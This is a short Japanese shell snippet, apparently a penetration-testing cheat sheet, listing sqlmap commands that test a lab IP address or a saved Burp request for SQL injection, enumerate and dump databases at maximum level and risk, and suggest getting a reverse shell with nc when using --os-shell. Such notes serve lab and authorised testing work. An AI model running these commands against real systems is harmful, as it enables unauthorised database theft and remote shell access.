
```sh
# パラメータを指定してテスト
sqlmap -u http://192.168.154.48/index.php?id=1 -p id --dbs --batch

# burpなどで保存したリクエストに対してテスト
sqlmap -r r.txt --dbs --batch
sqlmap -r r.txt --level=5 --risk=3 --string="Wrong identification" --dump
# --string, --not-stringオプションで成功・失敗の文字列定義が可能
# --threads=10で多少テストが早くなる
# SQLi脆弱性の種類（タイムベースのものなど）によって出力のたびに時間がかかるので--os-shellオプションを指定する場合、ncなどでリバースシェルを取り直したほうがスムーズ
```